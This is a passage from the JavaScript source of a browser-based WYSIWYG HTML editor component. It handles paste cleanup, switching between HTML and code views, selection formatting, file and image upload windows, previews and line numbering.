	local.TextAreaChangeLine.style.width ="100%";
	local.TextAreaChangeLine.style.height ="inherit";
	local.TextAreaChangeLine.style.overflow="hidden";
	local.TextAreaChangeLine.style.boxSizing="border-box";
	local.TextAreaChangeLine.style.position="relative";

	local.TextAreaChangeLineContainer.appendChild(local.TextAreaChangeLine);
	
	local.ChangeLine();
	
	
	if(local.EditPanelDivBody)
		local.EditPanelDivBody.innerHTML='';
	else local.EditPanelDivBody=document.createElement("table");
	
	local.EditPanelDivBody.style.display="table";
	local.EditPanelDivBody.id=local.EditPanelId+"_epBody"
	local.EditPanelDivBody.className="epBody"
	local.EditPanelDivBody.style.overflow="hidden";
	local.EditPanelDivBody.style.height="inherit";
	
	local.EditPanelDivBodyTable=document.createElement("tr");
	local.EditPanelDivBodyTable.id=local.EditPanelId+"_epBodyTable"
	local.EditPanelDivBodyTable.className="epBodyTable";
	local.EditPanelDivBodyTable.style.display="table-row";
	local.EditPanelDivBodyTable.style.height="inherit";
	
	
	if(isShow)local.EditPanelDivBodyTable.appendChild(local.TextAreaChangeLineContainer);
	
	if(!pickUp)pickUp=local.ShowType;

	switch(pickUp)
	{
		
		case "html":
		case "all":
		case "*":
		case "":
		case 0:
		default:
		//
			local.EditPanelFrame.style.display="table-cell";
			local.EditPanelDivBodyTable.appendChild(local.EditPanelFrame);
		break;//Show HTML Editor
		case "text":
		case 1:
			local.EditPanelCodingContainer.style.display="table-cell";
			AddEventByString(local.EditPanelCoding,"keydown","if(event.keyCode==13 || event.keyCode==8 || event.keyCode==9 || event.keyCode==46)GlobalEditPanelArray['"+indx+"'].ChangeLine();");
			AddEventOnObject(local.EditPanelCoding,"scroll",local.ChangeLine);
			AddEventOnObject(local.EditPanelCoding,"change",local.ChangeLine);
			AddEventByString(local.EditPanelCoding,"mouseup","document.getElementById('"+idd+"_linecounter').style.height=ZoomMinus(document.getElementById('"+local.EditPanelId+"_epBody').style.height,'30px');");
			
				AddEventByString(local.EditPanelCoding,"focus","document.getElementById('"+idd+"_linecounter').style.height=ZoomMinus(document.getElementById('"+local.EditPanelId+"_epBody').style.height,'30px');");
				AddEventByString(local.EditPanelCoding,"enter","document.getElementById('"+idd+"_linecounter').style.height=ZoomMinus(document.getElementById('"+local.EditPanelId+"_epBody').style.height,'30px');");
				
			local.EditPanelCodingContainer.appendChild(local.EditPanelCoding);
			local.EditPanelDivBodyTable.appendChild(local.EditPanelCodingContainer);
		break;//Show TextArea
	}
	
	local.EditPanelDivBody.appendChild(local.EditPanelDivBodyTable);

return local.EditPanelDivBody;	
}
//--------------------------------------------------------
this.pasteInSelection=function pasteInSelection(vhtml){
	var divframe=local.EditPanelFrame;// GetFrameAttr(objnm+EditPanelIDAddon);
    var objframe=divframe.FrameObject;
    var objdoc=divframe.FrameDocument;
    var objhtml=divframe.FrameMainDiv;
	
	var sel1=local.storeCurrentSelection(objframe,objdoc);
	if(divframe){
		local.restoreSelection(objframe,objdoc,sel1);
		var sText =(objdoc.selection?objdoc.selection.createRange():divframe.FrameWindow.getSelection());
		if(BrowserType==1)sText.pasteHTML(vhtml);
		else objdoc.execCommand('insertHTML',false,vhtml);
	}
}
//--------------------------------------------------------
this.pasteControl=function pasteControl(ev){
	var clipboardData, pastedData;
	var pastedData,cleanHtmlData,clipData;
	var e=ev || window.event;
    if(tagflt=document.getElementById(local.EditPanelId+"_tagfilter"))
	{
		tagflt=String(tagflt.value).split(",");
	}else tagflt='';
	
	clipboardData = e.clipboardData || window.clipboardData;
	
	switch(local.CodingLanguage)
	{
		case 'PHP':local.pasteInSelection(pastedData);break;
		default:
		cleanHtmlData=clipData="";
		if(clipboardData.types.indexOf('text/html') > -1){
			clipData = clipboardData.getData('text/html');
			cleanHtmlData=cleanWordContent(clipData);
		}
		else {
			cleanHtmlData=clipData = clipboardData.getData('text');
		}

		
		console.log(clipData);
		console.log(cleanHtmlData);

		
		var r=false;
		if(cleanHtmlData!=clipData)r = confirm("Do you whant remove extra tags?");
		if(r==true){
			pastedData=cleanHtmlData;
		}else{
			pastedData = clipData;
		}
		local.pasteInSelection(pastedData);
	}

	if (e.preventDefault)e.preventDefault();
	else e.returnValue = false;

return true;
}
//--------------------------------------------------------
this.LoadFrameContent=function LoadFrameContent()
{
//console.log("EP3:"+local.EditPanelContent.id);
    local.EditPanelFrame=GetFrameAttr(local.EditPanelContent.id);
//	console.log(local.TextAreaObject);
//	console.log(local.getElValue(local.TextAreaObject));
    if(tagflt=document.getElementById(local.EditPanelId+"_tagfilter"))
	{
		tagflt=String(tagflt.value).split(",");
	}else tagflt='';
	
	switch(local.CodingLanguage)
	{
		case 'PHP':local.SetFrameInnerHTML(EditPanelValueDecoder(local.getElValue(local.TextAreaObject)));
			break;
		default:
		local.SetFrameInnerHTML(HTMLFilter(EditPanelValueDecoder(local.getElValue(local.TextAreaObject)),tagflt));
	}
	
	
	var objPointer=local.EditPanelFrame.FrameDocument.body;
	AddEventByString(objPointer,"keydown","if(event.keyCode==13 || event.keyCode==8 || event.keyCode==9 || event.keyCode==46)GlobalEditPanelArray['"+local.EditPanelIndex+"'].HeightSizeCorrect();");
	AddEventOnObject(objPointer,"scroll",local.HeightSizeCorrect);
	AddEventOnObject(objPointer,"change",local.HeightSizeCorrect);
	AddEventByString(objPointer,"mouseup","GlobalEditPanelArray['"+local.EditPanelIndex+"'].HeightSizeCorrect();");	
	AddEventOnObject(objPointer,"blur",local.sync);
	AddEventOnObject(objPointer,"paste",local.pasteControl);
	AddEventByString(objPointer,"click","GlobalEditPanelArray['"+local.EditPanelIndex+"'].PanelAutomize();");	
	
	local.HeightSizeCorrect();
	
	//local.EditPanelObject.ondragover=function(){alert(1);};
	//local.EditPanelObject.ondrop=function(){alert(2);};
	try{
	AddEventByString(local.EditPanelFrame.FrameDocument.body,"dragover","GlobalEditPanelArray['"+local.EditPanelIndex+"'].allowDrop(event)");
	AddEventByString(local.EditPanelFrame.FrameDocument.body,"drop","GlobalEditPanelArray['"+local.EditPanelIndex+"'].drop(event)");
	}catch(e){
		console.log("EditPanel: "+e);
	}
	
}

//--------------------------------------------------------
this.SetEditorSettings=function SetEditorSettings()
{
    var frm=local.EditPanelFrame;//GetFrameAttr(iddnm);//+EditPanelIDAddon
    var FrameID=frm.FrameObject;
    var locdoc=frm.FrameDocument;
    var locbody=frm.FrameDocument.body;

	if(locbody)
	{
        locbody.style.backgroundColor='#FFFFFF';
        locbody.style.border='';
        locbody.style.scrollbarBaseColor='#A9A7C0';

        locbody.style.marginLeft='0px';
        locbody.style.marginRight='0px';
        locbody.style.marginTop='0px';
        locbody.style.marginBottom='0px';

        locbody.style.paddingLeft='0px';
        locbody.style.paddingRight='0px';
        locbody.style.paddingTop='0px';
        locbody.style.paddingBottom='0px';
        locbody.setAttribute('contentEditable',true);
     try{
			locdoc.execCommand("2D-Position", true, true);
			locdoc.execCommand("MultipleSelection", true, true);
			locdoc.execCommand("LiveResize", true, true);
        }catch(e){return false;};

	}else return false;

return true;
}
//--------------------------------------------------------
this.SetFrameInnerHTML=function SetFrameInnerHTML(txt)
{
	if(!local.EditPanelFrame)local.EditPanelFrame=GetFrameAttr(local.EditPanelContent.id);
    var FrameID=local.EditPanelFrame.FrameObject;
    var locdoc=local.EditPanelFrame.FrameDocument;
    var locbody=local.EditPanelFrame.FrameDocument.body;
	var locwin=local.EditPanelFrame.FrameWindow;
	var repeat=true;

	if(locwin)locwin.parentIFrame=local.EditPanelContent;	

    if(locbody)
    {
        locbody.innerHTML=txt;
        if(local.SetEditorSettings())repeat=false;
		locbody.style.background='#FFFFFF';
    };
}
//--------------------------------------------------------
this.Value=function Value()
{
	switch(local.ShowType)
	{
		case "text":
		case 1:return local.EditPanelCoding.value;
/*		case "html":
		case "all":
		case "*":
		case "":
		case 0:
		default:return local.EditPanelFrame.FrameDocument.body.innerHTML;*/
	}

	return local.EditPanelFrame.FrameDocument.body.innerHTML;
}
//--------------------------------------------------------
this.value=function value(){return local.Value();};
this.GetValue=function GetValue(){return local.Value();}
this.SetValue=function SetValue(val){local.EditPanelCoding.value=val;loca.sync();return val;}
//--------------------------------------------------------
this.ShowCoding=function ShowCoding()
{
	local.ShowType="text";
	local.EditPanelObject.innerHTML='';
	local.DrawHideEncoding();	
	local.EditPanelObject.appendChild(local.DrawPanel("text"));
	local.EditPanelObject.className="edit_panel_container text";
	local.EditPanelObject.appendChild(local.DrawCoding());
}
//--------------------------------------------------------
this.ShowEditPanel=function ShowEditPanel()
{
	local.ShowType="html";
	local.EditPanelObject.innerHTML='';
	local.EditPanelObject.className="edit_panel_container html";
	local.DrawHideEncoding();
	local.EditPanelObject.appendChild(local.DrawPanel());
	local.EditPanelObject.appendChild(local.DrawFrame());

}
//--------------------------------------------------------
this.ChangeModel=function ChangeModel()
{
	local.sync();
	switch(local.ShowType)
	{
		case "html":
		case "all":
		case "*":
		case "":
		case 0:
		default:local.ShowType="text";local.ShowCoding();break;
		case "text":
		case 1:local.ShowType="html";local.ShowEditPanel();break;
	}
}
//--------------------------------------------------------
this.setElValue=function setElValue(el,val){
	if((["textarea","input"].indexOf(el.tagName.toLowerCase())!=-1))return (el.value=val);
	return (el.innerHTML=val);
}
//--------------------------------------------------------
this.getElValue=function getElValue(el){
	if((["textarea","input"].indexOf(el.tagName.toLowerCase())!=-1)) return (el.value);
	return (el.innerHTML);
}
//--------------------------------------------------------
this.sync=function sync()
{
	switch(local.ShowType)
	{
		
		case "html":
		case "all":
		case "*":
		case "":
		case 0:
		default:
			if(local.DataFormat=="html")
				local.setElValue(local.TextAreaObject,(local.EditPanelCoding.value=HtmlDecode(local.Value())));
			else
				local.setElValue(local.TextAreaObject,(local.EditPanelCoding.value=local.Value()));
			break;//Show HTML Editor //devmode
		case "text": 
		case 1:local.SetFrameInnerHTML(local.setElValue(local.TextAreaObject,(local.EditPanelCoding.value)));break;//Show TextArea  //devmode
	}
}
//--------------------------------------------------------
this.destroy=function destroy()
{
	RemoveObjectEx(local.EditPanelObject);
}
//--------------------------------------------------------
this.reset=function reset()//same load at first
{
	local.SetFrameInnerHTML(local.EditPanelCoding.value=EditPanelValueDecoder(local.getElValue(local.TextAreaObject)));
}
//--------------------------------------------------------
this.clear=function clear()
{
	local.SetFrameInnerHTML(local.EditPanelCoding.value=local.setElValue(local.TextAreaObject,""));
}
//--------------------------------------------------------
this.set=function set(str)
{
	local.SetFrameInnerHTML(local.EditPanelCoding.value=EditPanelValueDecoder(local.setElValue(local.TextAreaObject,str)));
}
//--------------------------------------------------------
this.Exec=function Exec(cmd,param1,js2)
{
    var divframe=local.EditPanelFrame;// GetFrameAttr(objnm+EditPanelIDAddon);
    var objframe=divframe.FrameObject;
    var objdoc=divframe.FrameDocument;
    var objhtml=divframe.FrameMainDiv;

   var sel1=local.storeCurrentSelection(objframe,objdoc);
if(divframe)
{

    local.restoreSelection(objframe,objdoc,sel1);
    var sText =(objdoc.selection?objdoc.selection.createRange():divframe.FrameWindow.getSelection());

    if (!(sText==''))
    {
           local.restoreSelection(objframe,objdoc,sel1);
           switch(cmd.toLowerCase())
           {
              case 'utf8':
              {
					if(sText && sText!=null && sText!=undefined){
					  var txt=AcadToSylfaen(String((sText.text?sText.text:sText)));
                      if(BrowserType==1)sText.pasteHTML(txt);
                      else 
                      objdoc.execCommand('insertHTML',false,txt);
					}else {
						var objtxt=local.EditPanelCoding;
						objtxt.value=AcadToSylfaen(objtxt.value);
					}
              };

              break;
              case 'ansi':
              {
					if(sText && sText!=null && sText!=undefined){
                      var txt=SylfaenToAcad(String((sText.text?sText.text:sText)));
                      if(BrowserType==1)sText.pasteHTML(txt);
                      else objdoc.execCommand('insertHTML',false,txt);
					}else {
						var objtxt=local.EditPanelCoding;
						objtxt.value=SylfaenToAcad(objtxt.value);
					  }
              };
              break;
              case 'jmixx':
              {
					if(sText && sText!=null && sText!=undefined){			  
                      var txt=EditPanelValueDecoder(String((sText.text?sText.text:sText)));
                      if(BrowserType==1)sText.pasteHTML(txt);
                      else 
                      objdoc.execCommand('insertHTML',false,txt);
					}else {
						var objtxt=local.EditPanelCoding;
						objtxt.value=EditPanelValueDecoder(objtxt.value);
					  }					
              };
              break;
              case 'color':
              {
					if(sText && sText!=null && sText!=undefined){
						var txt='<span style="color:'+param1+'">'+HtmlDecode(String((sText.text?sText.text:sText)))+'</span>';
						if(BrowserType==1)sText.pasteHTML(txt);
						else objdoc.execCommand('insertHTML',false,txt);
					  }else {
						var objtxt=local.EditPanelCoding;
						objtxt.value=HtmlDecode(objtxt.value);
					  }
              };
              break;			  
              case 'quotes':
              {
					if(sText && sText!=null && sText!=undefined){
						var txt=HtmlDecode(String((sText.text?sText.text:sText)));
						if(BrowserType==1)sText.pasteHTML(txt);
						else objdoc.execCommand('insertHTML',false,txt);
					  }else {
						var objtxt=local.EditPanelCoding;
						objtxt.value=HtmlDecode(objtxt.value);
					  }
              };
              break;			  
              default:
                 objdoc.execCommand(cmd,false,param1);
           }
   }
   else
   {
            objdoc.execCommand(cmd,false,param1);
   }
   
   if(js2 && sText && sText!=null && sText!=undefined){
   
		//objdoc.execCommand("fontSize",false,1);
		GlobText=sText;//REMOVE THIS IS FOR DEBUG
		if(sText.anchorOffset>sText.focusOffset){
			start=sText.focusNode;
			end=sText.anchorNode;
		}else{
			start=sText.anchorNode;
			end=sText.focusNode;
		}
		item=start;
		parent='';
		do{
			if(item)try{parent=item.parentElement || item.parentNode}catch(e){console.log('edit_panel parental eval:  '+e);};
			try{eval(js2);}catch(e){console.log('edit_panel eval-js2: '+js2+': '+e);break;}
			if(item==end)break;
		}while(!(item=item.nextSibling));
	
   }
   
   
};

};
//-------------------------------------------------
this.PackLinks=function PackLinks(tagx,parx)
{
	if(!tagx)tagx='img';
	if(!parx)parx='src';

//--------
    var hpath=window.location.pathname;
    var k=hpath.lastIndexOf("/");
    var k2=hpath.lastIndexOf("\\");
    if(k2>k)k=k2;
    if(k>0)hpath=hpath.substr(0,k);
	hpath=hpath+'/';
	while((hpath[hpath.length-1]=='/')||(hpath[hpath.length-1]=='\\'))hpath=hpath.substr(0,hpath.length-1);
    var hlink="http://"+window.location.host+hpath+"/";

    var divhtm=local.EditPanelFrame.FrameMainDiv;
    var ImOs;

	if(divhtm.getElementsByTagName)ImOs=divhtm.getElementsByTagName(tagx);
	else ImOs=divhtm.all.tags(tagx);
          
	var htmv="";
	for(var i=0;i<ImOs.length;i++)
	{
		var hsrc=ImOs[i].getAttribute(parx);
		if(hsrc.substr(0,hlink.length)==hlink)
		{
			htmv+=hsrc.substr(hlink.length)+"|";
		}
	}

	if(htmv)
	{
		window.open(local.index_php+"?phpParam=ep_pack.php&"+SIDNAME+"="+SID+"&pfn="+local.EditPanelId+"&files="+htmv,'_self');
	}

return 0;
}
//-------------------------------------------------
this.ChangeBackground=function ChangeBackground()
{
	var bgcid="ep_xchgbg_"+local.TextAreaObject.name+"_"+GlobalEditPanelId;
	var inp=document.getElementById("bgcid");
	if(!inp || inp==undefined){
		inp=document.createElement("input");
		inp.id=bgcid;
	}
	inp.style.display="none";
	inp.type="color";
	inp.setAttribute("data-name",local.TextAreaObject.name);
	inp.click();
	
	//console.log(inp);
	local.TextAreaObject.appendChild(inp);
	//document.body.appendChild(inp);
	AddEventOnObject(inp,"change",function(){
		var x=new EditPanel().xGet(this.getAttribute("data-name"));
		if(x.EditPanelCoding)x.EditPanelCoding.style.background=this.value;
		if(x.EditPanelFrame)x.EditPanelFrame.FrameDocument.body.style.background=this.value;
	});

return true;
}
//-------------------------------------------------
this.ChangeBackground=function ChangeBackground()
{
	var bgcid="ep_xchgbg_"+local.TextAreaObject.name+"_"+GlobalEditPanelId;
	var inp=document.getElementById(bgcid);
	if(!inp || inp==undefined){
		inp=document.createElement("input");
		inp.id=bgcid;
	}
	inp.style.display="none";
	inp.type="color";
	inp.setAttribute("data-name",local.TextAreaObject.name);
	inp.click();
	
	//console.log(inp);
	local.TextAreaObject.appendChild(inp);
	//document.body.appendChild(inp);
	AddEventOnObject(inp,"change",function(){
		var x=new EditPanel().xGet(this.getAttribute("data-name"));
		if(x.EditPanelCoding)x.EditPanelCoding.style.background=this.value;
		if(x.EditPanelFrame)x.EditPanelFrame.FrameDocument.body.style.background=this.value;
	});

return true;
}
//-------------------------------------------------
this.ChangeColor=function ChangeColor()
{
	var bgcid="ep_color_"+local.TextAreaObject.name+"_"+GlobalEditPanelId;
	var inp=document.getElementById(bgcid);
	if(!inp || inp==undefined){
		inp=document.createElement("input");
		inp.id=bgcid;
	}
	inp.style.display="none";
	inp.type="color";
	inp.setAttribute("data-name",local.TextAreaObject.name);
	inp.click();
	
	//console.log(inp);
	local.TextAreaObject.appendChild(inp);
	//document.body.appendChild(inp);
	AddEventOnObject(inp,"change",function(){
		var x=new EditPanel().xGet(this.getAttribute("data-name"));
		x.Exec('color',this.value);
	});

return true;
}


//-----------------------------------------------------------------------------------------------------------------------------------------------
this.UploadWinId;
this.UploadInsertId=0;
this.CloseWin=function CloseWin()
{
    if(local.UploadWinId)
    if(document.getElementById(local.UploadWinId))
   {
        document.getElementById('MainDocument').style.backgroundColor='#00000FF';
        if(document.body.filters)
           document.getElementById('MainDocument').style.filter="";
       else
           document.getElementById('MainDocument').style.opacity=0.9;
      ShowNormalMainWin();
      document.getElementById(local.UploadWinId).parentNode.innerHTML='';
   }

}
//-----------------------------------------------------------------------------------------------------------------------------------------------
this.OpenUploadWin=function OpenUploadWin(tp,xchg)//tp - img or 1, tp- fl or 2, tp- lnk or 3;;;    xchg- 0=Add Childs, 1=Change Parent, 2=Change Child, Link=Set Link, other string - direct insert img link
{
		if(!xchg)xchg=0;
       var tps="a",vfile;
	   var inId=local.EditPanelId+"_"+local.UploadInsertId;
	   local.UploadInsertId++;
       switch(tp)
       {
           case 4:
           case 'css':
                tps='div';
				vfile="insert_style.php";
           break;
	   
           case 2:
           case 'fl':
                tps='a';
				vfile="upload_file.php";
           break;

           case 3:
           case 'lnk':
                tps='a';
				vfile="insert_link.php";
           break;

           case 1:
           case 'img':
           default:
                tps='img';
				vfile="upload_img.php";
           break;

       }

    var divframe=local.EditPanelFrame;
    var objframe=divframe.FrameObject;
    var objdoc=divframe.FrameDocument;
    var objhtml=divframe.FrameMainDiv;
    var vNotExist=1;
    if(objframe.focus)objframe.focus();

   var dt = new Date();
   var imgid="upimg",imgalias="upimg";
   imgid=imgid.concat(dt.getYear(),dt.getMonth(),dt.getDay(),dt.getHours(),dt.getMinutes(),dt.getSeconds(),dt.getMilliseconds(),inId);

   var sel1=local.storeCurrentSelection(objframe,objdoc);
   if(divframe)
   {

       local.restoreSelection(objframe,objdoc,sel1);
       var t1=0,t2=0;
       var sText =(objdoc.selection?objdoc.selection.createRange():divframe.FrameWindow.getSelection());
       
       var sObject=0;

	//for IE: 
	if(sText.htmlText)
	{
		var psi=0;
		try{
		psi++;
  		var vcode=sText.htmlText;
		psi++;
  		var regex = new RegExp("<img[\s]*[^>]+>","gi");
  		vcode=vcode.match(regex);
		psi++;
  		var regex2 = new RegExp("(\s)*id=[0-9a-zA-Z_\"']*","gi");
  		vcode=vcode[0].match(regex2);
		psi++;

  		var regex3 = new RegExp("=[0-9a-zA-Z_\"']*","gi");
  		vcode=vcode[0].match(regex3);

		psi++;
  		var regex4 = new RegExp("[0-9a-zA-Z_]*","gi");
  		vcode=vcode[0].match(regex4);

		psi++;
  		imgid=vcode[1];
  		vNotExist=0;
  		}catch(e){  alert("error "+vcode+" "+psi);}

	}


	try
	{
		if(divframe.FrameWindow.getSelection)
		sObject=divframe.FrameWindow.getSelection().getRangeAt(0);//extractContents();//.ownerDocument;
	}	
	catch(e){}

	var sItems=0;
	if(sObject)
	if(sObject.getElementsByTagName)sItems=sObject.getElementsByTagName(tps);
	else if(sObject)sItems=sObject.cloneContents().childNodes;
	
	var result="",byCursorValue;

	for(var i=0;i<sItems.length;i++)
	{
		try{
		if(byCursorValue=sItems.item(i))
			if(byCursorValue.tagName)
				if(String(byCursorValue.tagName).toLowerCase()==tps)
         {
            //result+=byCursorValue.tagName.toLowerCase()+"=="+tps+"*. ";
            result+=byCursorValue.tagName+" ";
            break;
         }//else result+=byCursorValue.tagName.toLowerCase()+"=="+tps+"*. ";
		}catch(e){};
	}

	try{
	if(byCursorValue)
	{
		if(String(byCursorValue.tagName).toLowerCase()==tps)
		{
			imgid=byCursorValue.id;
			vNotExist=0;
		}
	}
	}catch(e){}

		var vhtml="";
		var vStr=String((sText.text?sText.text:sText));
		
    var currObj=0;
	try{
		currObj=sObject.startContainer || sObject.endContainer; 
		currObj=currObj.parentElement || currObj.parentNode;
	}	
	catch(e){};
	
	if((currObj && currObj.id) && (imgalias==currObj.id.substr(0,imgalias.length)) && (currObj.innerText==vStr)){
		imgid=currObj.id;
		vNotExist=0;
	}
		
 
       if(vNotExist)
       {
       switch(tp)
       {
           case 4:
           case 'css':
				vhtml="<div id='"+imgid+"' name='"+imgid+"' class=\"\" style=\"\">"+vStr+"</div>";
           break;
	   
           case 2:
           case 'fl':
				vhtml="<a id='"+imgid+"' name='"+imgid+"' href=''  >"+vStr+"</a>";
           break;

           case 3:
           case 'lnk':
				vhtml="<a id='"+imgid+"' name='"+imgid+"' href=''  >"+vStr+"</a>";
           break;

           case 1:
           case 'img':
           default:
				var imgsrc='';
				if(xchg.length>4)  imgsrc=xchg;
				vhtml="<img width='40px' id='"+imgid+"' src='"+imgsrc+"'  >";
           break;
       }

       local.restoreSelection(objframe,objdoc,sel1);
       if(BrowserType==1)sText.pasteHTML(vhtml);
       else objdoc.execCommand('insertHTML',false,vhtml);
      }
      else
      {
          //local.restoreSelection(objframe,objdoc,sel1);
      }

     if(xchg==0 || xchg==1 || xchg==2 || xchg==3)
     {
		AlphaMainWin(0.5);
		local.CloseWin();
		WinSetName(local.EditPanelUploadingWinName);
		WinSetZoom('640px','400px');
		WinSetCenter();
		local.UploadWinId=CreateHTMLWindow();
		document.getElementById(local.UploadWinId+'_ca').style.overflow='hidden';
		document.getElementById(local.UploadWinId+'_ca').innerHTML="<iframe  class='EP_INSERT_FRAME' style='width:100%;height:350px;box-sizing:border-box;border:1px solid #ccc;' src=\""+local.index_php+"?phpParam="+vfile+"&"+(SIDNAME?SIDNAME+"="+SID+"&":"")+"frame="+local.EditPanelId+"&obj=&nextformname=og&og_hobj="+imgid+"&tabnm=bc_uploads&gc_req=edit&scriptinitial=y\" scrolling='auto'></iframe>";
	 } else {
		console.log(imgid);
	 }

   };
}
//-----------------------------------------------------------------------------------------------------------------------------------------------
this.UploadComplete=function UploadComplete(evt,par)
{
    var xmlDoc;
    var txt=evt.target.responseText;

	if(!txt) return;
	
	var lnk=0;
	var txtIfJson = 0;
	try { txtIfJson=JSON.parse(txt); } catch(e){console.log(e);}
	
	if ((typeof txtIfJson) == "object")
	{
		//Json
		console.log(txtIfJson);
		if(txtIfJson.link && txtIfJson.link!=undefined)
			lnk=txtIfJson.link[0];
		else 
			lnk=txtIfJson.Link[0];
	}
	else
	{
		//Not Json
		if (window.DOMParser)
		{
			parser=new DOMParser();
			xmlDoc=parser.parseFromString(txt,"text/xml");
		}
		else // Internet Explorer
		{
			xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
			xmlDoc.async=false;
			xmlDoc.loadXML(txt);
		} 
		var els=xmlDoc.getElementsByTagName('link');
		if(!els || els.length==0 || els[0]==undefined)els=xmlDoc.getElementsByTagName('Link');
		if(els)lnk=els[0].childNodes[0].nodeValue;
	}
	
	//console.log(lnk);
	if(lnk)
	{
	    local.OpenUploadWin('img',lnk);
	}
	
}
//-----------------------------------------------------------------------------------------------------------------------------------------------
this.winMaximize=function winMaximize()
{
	var ob=local.EditPanelObject;
	if(!ob.getAttribute("data-position"))ob.setAttribute("data-position","minimized");
	var pos=ob.getAttribute("data-position");
	if(pos=="minimized")
	{
		ob.style.position="fixed";
		ob.style.backgroundColor="white";
		ob.style.border="0px solid grey";
		ob.style.top="0px";
		ob.style.left="0px";
		ob.style.right="0px";
		ob.style.bottom="0px";
		ob.style.width="100%";
		ob.style.height="100%";
		ob.style.zIndex=10000;
		
		document.body.style.overflow="hidden";
		
		ob.setAttribute("data-position","maximized");
		winmaximize(ob);
		
	}
	else
	{
		ob.setAttribute("data-position","minimized");
		winminimize(ob);
		
		ob.style.position="static";
		ob.style.border="1px solid grey";
		ob.style.width="100%";
		ob.style.height="100%";
		document.body.style.overflow="";
		
	}

	var els=ob.getElementsByClassName('EP_PROGRESS');
	for(var i=0;i<els.length;i++)
	{
		var cur=els[i];
		if(pos=="minimized")
		{
			cur.innerHTML="[-]";
		}
		else
		{
			cur.innerHTML="[><]";
		}
	}
	
	local.HeightSizeCorrect();
}
//-----------------------------------------------------------------------------------------------------------------------------------------------
this.docMarginField=function docMarginField(){
	var bd=local.EditPanelFrame.FrameDocument.body;
	if(db.classList.contains("ep_margin"))db.classList.remove("ep_margin");
	else db.classList.add("ep_margin");
	
	if(bd.style.margin!="30px")bd.style.margin="30px";
	else bd.style.margin="";
}
//-----------------------------------------------------------------------------------------------------------------------------------------------
this.ImageGalleryId=0;
this.ShowImageGallery=function ShowImageGallery()
{
	var indx=local.EditPanelIndex;
   GLOBWINDOWNAME='';
   winclose(local.ImageGalleryId);
   WinSetZoom(640,480);
   WinSetCenter();

   AlphaMainWin(0.5);
   local.ImageGalleryId=CreateHTMLWindow();
   var ClnA=document.getElementById(local.ImageGalleryId+'_ca');

   if(!ClnA){winclose(local.ImageGalleryId);return 0;}
  
    var divhtm=local.EditPanelFrame.FrameMainDiv;
    var ImOs;

    if(divhtm.getElementsByTagName)ImOs=divhtm.getElementsByTagName('img');
	else ImOs=divhtm.all.tags('img');

	var htmv="";
	var pimg="<img id='sig_"+indx+"' width='600px' src='"+(ImOs.length>0?ImOs[0].src:'')+"' >";
	for(var i=0;i<ImOs.length;i++)
	{
		htmv=htmv+"<a href='#' onclick=\"sig_"+indx+".src='"+ImOs[i].src+"'\" >"+i+"</a>&nbsp;";
	}
	ClnA.innerHTML=htmv+"<hr>"+pimg+"<hr>"+htmv;

return 0;
}
//--------------------------------------------------------
this.ShowView=function ShowView(vcssnm)
{
	var indx=local.EditPanelIndex;
	var cssobj=0;
	if(vcssnm)cssobj=document.getElementById(vcssnm);


   GLOBWINDOWNAME='';
   winclose(local.ImageGalleryId);
   WinSetZoom(640,480);
   WinSetCenter();

   AlphaMainWin(0.5);
   local.ImageGalleryId=CreateHTMLWindow();
   var ClnA=document.getElementById(local.ImageGalleryId+'_ca');

   if(!ClnA){winclose(local.ImageGalleryId);return 0;}
  

    var divhtm=local.EditPanelFrame.FrameMainDiv;
	var ImOs;

	var cssstr='';
	if(vcssnm)
	{
		if(vcssnm.tagName)
		if(vcssnm.tagName.toLowerCase()=='iframe')
		{
			var csshtm=GetFrameAttr(vcssnm).FrameMainDiv;
			cssstr='<style>'+csshtm.innerHTML+'</style>';
		}else
		if(vcssnm.tagName.toLowerCase()=='textarea')
		{
			cssstr='<style>'+document.getElementById(vcssnm).value+'</style>';
		}			 
	}
	ClnA.innerHTML=cssstr+divhtm.innerHTML;

return 0;
}
//---------------------------------------------------------------
this.CountLines=function CountLines(htmlContent)//htmlContent is object, htmlContent=document.getElementById('content');
{
   var zm=GetObjectZoomParameters(htmlContent);
    var divHeight = parseInt(zm.height);
    var lineHeight = 18;
    var lines = divHeight / lineHeight;
    return lines;
}
//---------------------------------------------------------------
this.ChangeLine=function ChangeLine()
{
	var objtxt="",ot_txt="",len=1;
	var objlincnt=local.TextAreaChangeLine;
	if(local.EditPanelDivBodyTable)local.EditPanelDivBodyTable.style.height="inherit";
	switch(local.ShowType)
	{
		case "html":
		case "all":
		case "*":
		case "":
		case 0:
		default:
		{
			objtxt=local.EditPanelContent;
			ot_txt=objtxt.innerHTML;
			len=local.CountLines(local.TextAreaObject);
			objlincnt.style.font=objtxt.style.font;
		}break;//Show HTML Editor
		case "text":
		case 1:
		{
			objtxt=local.EditPanelCoding;
			ot_txt=objtxt.value;
			len=ot_txt.split("\n").length;
			objlincnt.style.fontSize=objtxt.style.fontSize;
			objlincnt.style.fontFamily=objtxt.style.fontFamily;
			objlincnt.style.lineHeight=objtxt.style.lineHeight;
			objlincnt.style.textDecoration=objtxt.style.textDecoration;
			
		};break;//Show TextArea
	}

	var ret="";
	var els=objlincnt.getElementsByTagName("DIV");
	if(els.length<len)
	for(var yi=els.length;yi<=len;yi++)
	{
		var dv=document.createElement("DIV");
		dv.innerHTML=String(yi+1);
		objlincnt.appendChild(dv);
	}

	objlincnt.scrollTop=objtxt.scrollTop;
	if(objlincnt.scrollTop!=objtxt.scrollTop)objlincnt.style.top=0-objtxt.scrollTop;
}
//---------------------------------------------------------------
this.HeightSizeCorrect=function HeightSizeCorrect()
{
	var mainDiv=GetObjectZoomParameters(local.EditPanelObject);
	var panel=GetObjectZoomParameters(local.EditPanelDivPanel);
	
	if(ZoomMinus(mainDiv.height,panel.height)!="0px")
		local.EditPanelContent.style.height=local.EditPanelDivBody.style.height=ZoomMinus(mainDiv.height,(parseInt(panel.height)+10));
	else
		local.EditPanelContent.style.height=local.EditPanelDivBody.style.height="inherit";
}
//------------------------------------------------------------------
this.PanelAutomize=function PanelAutomize()
{
	;
}
//------------------------------------------------------------------
this.AddButtonEx=function AddButtonEx(vName,obj){
	if(!local.EPButtons)local.EPButtons=new Array();
	local.EPButtons.push(vName);
	if(!local.EPButtonsAction)local.EPButtonsAction={};
	local.EPButtonsAction[vName]=obj;
}
//-----------------------------------------------------------------
this.AddButton=function AddButton(vName,cont,attr,func,tagflts,vMode){
	if(!vName)return false;
	if(!cont)cont="";
	if(!attr)attr={};
	if(!func)func=function(){};
	if(!tagflts)tagflts="";
	if(!vMode)vMode="all";
	
